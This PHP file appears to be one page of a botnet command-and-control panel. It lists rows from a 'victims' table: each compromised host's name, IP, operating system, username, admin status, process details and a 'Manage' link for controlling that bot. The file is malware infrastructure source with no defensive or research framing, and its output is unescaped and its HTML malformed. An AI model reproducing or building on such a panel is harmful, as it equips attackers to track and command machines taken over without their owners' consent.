<?php
include 'session.php';
include 'conn.php';
?>




<html>
<style>
    th, td{
        border: 1px solid;
    }
</style>
<center>
    <table>
        <tr>
            <th>Hostname</th>
            <th>Ip Address</th>
            <th>Operating System</th>
            <th>Username</th>
            <th>TMP Path</th>
            <th>Is Admin</th>
            <th>pwd</th>
            <th>Process Name</th>
            <th>File Name</th>
            <th>Process ID</th>
            <th>Action</th>
        </tr>
        <?php

        $botQuery = $mysql->query("select * from victims");

        while($row = $botQuery->fetch_assoc())
        {
            $hostname = $row["hostname"];
            $os = $row["os"];
            $ip = $row["ip"];
            $username = $row["username"];
            $tmp_path = $row["tmp_path"];
            $is_admin = $row["is_admin"];
            $pwd = $row["pwd"];
            $process_name = $row["process_name"];
            $file_name = $row["file_name"];
            $process_id = $row["process_id"];
            $action = "<a href='/manage.php?bot=" . $hostname . "'>Manage</a>";

            echo "<td>".$hostname."</td>";
            echo "<td>".$ip."</td>";
            echo "<td>".$os."</td>";
            echo "<td>".$username."</td>";
            echo "<td>".$tmp_path."</td>";
            echo "<td>".$is_admin."</td>";
            echo "<td>".$pwd."</td>";
            echo "<td>".$process_name."</td>";
            echo "<td>".$file_name."</td>";
            echo "<td>".$process_id."</td>";
            echo "<td>".$action."</td>";

            echo "</tr>";
        }
        ?>


        <table>
</center>


</html>
